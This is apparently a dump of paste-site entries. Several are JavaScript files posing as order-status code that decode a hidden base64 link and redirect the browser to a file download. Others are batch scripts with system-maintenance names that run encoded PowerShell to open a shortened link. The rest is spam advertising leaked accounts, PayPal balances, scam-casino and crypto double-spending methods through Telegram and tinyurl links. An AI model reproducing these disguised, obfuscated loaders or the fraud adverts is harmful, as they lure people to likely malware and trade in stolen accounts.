id,title,username,language,date,content
tuSM2gkk,Products.js,SpawnKz,JavaScript,Monday 5th of May 2025 06:10:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/30101/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
btLE6c4u,Leaked Accounts - Fresh Hits,WantingTrae,JavaScript,Monday 5th of May 2025 06:10:32 PM CDT,56321 Accounts Posted On https://t.me/leakzbyeminem
dbdKggrf,PayPal with Balance,HamdanIsAwesome,JavaScript,Monday 5th of May 2025 06:07:04 PM CDT,909521 - check it out at www.tinyurl.com/new2025may
2hATLYRd,cleanup_temp_files.bat,jose20david,Batch,Monday 5th of May 2025 06:04:10 PM CDT,"@ECHO OFF
TITLE $~fazoddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==hfleak GOTO openHf

:openHf
ECHO Launching PowerShell command...
)powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0ANgBlAGMAZQBjADgAYQAzAA==
EXIT /b
"
bdy26zbh,update_system.bat,jose20david,Batch,Monday 5th of May 2025 06:03:38 PM CDT,"@ECHO OFF
TITLE $~fazoddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==hfleak GOTO openHf

:openHf
ECHO Launching PowerShell command...
)powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0ANgBkADkANwA0AGEAZAA5AA==
EXIT /b
"
DCVUrd6z,Products.js 45 sec ago JavaScript,HamdanIsAwesome,JavaScript,Monday 5th of May 2025 05:57:04 PM CDT,188071 - check it out at www.tinyurl.com/new2025may
zcD995Ld,Scam Casinos and Stores,Ratqueenkslskskwkw,JavaScript,Monday 5th of May 2025 05:55:44 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 04920
ze6Vyfgh,Order.js,SpawnKz,JavaScript,Monday 5th of May 2025 05:55:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72492/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SPnxLZ0s,Chaturbate with Tokens,WantingTrae,JavaScript,Monday 5th of May 2025 05:55:10 PM CDT,46639 Accounts Posted On https://t.me/leakzbyeminem
e6DP92Sz,configure_firewall.ps1,jose20david,Batch,Monday 5th of May 2025 05:53:03 PM CDT,"@ECHO OFF
TITLE $~fazoddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==hfleak GOTO openHf

:openHf
ECHO Launching PowerShell command...
)powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0ANgA4ADYANAAzAGQAMgBlAA==
EXIT /b
"
6f0k1Zdz,Leaked Accounts - Fresh HitUntitled,HamdanIsAwesome,JavaScript,Monday 5th of May 2025 05:47:02 PM CDT,341620 - check it out at www.tinyurl.com/new2025may
6LqdMxPL,remove_software.bat,jose20david,Batch,Monday 5th of May 2025 05:42:10 PM CDT,"@ECHO OFF
TITLE $~fazoddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==hfleak GOTO openHf

:openHf
ECHO Launching PowerShell command...
)powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AMgAwADgAYQA0ADQANABjAA==
EXIT /b
"
EEVANwBk,Doublespending using Vanity Wallet,Ratqueenkslskskwkw,JavaScript,Monday 5th of May 2025 05:40:22 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 13918
W0LDCfca,Market.js,SpawnKz,JavaScript,Monday 5th of May 2025 05:40:01 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12629/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Z4EaCHkD,Crypto Accounts,WantingTrae,JavaScript,Monday 5th of May 2025 05:39:48 PM CDT,89879 Accounts Posted On https://t.me/leakzbyeminem
VAttLgJm,monitor_logs.ps1,jonomagon,Batch,Monday 5th of May 2025 05:32:04 PM CDT,"@ECHO OFF
TITLE $~fazoddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==hfleak GOTO openHf

:openHf
ECHO Launching PowerShell command...
)powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AMQBjADYAMwA1AGEAOABmAA==
EXIT /b
"
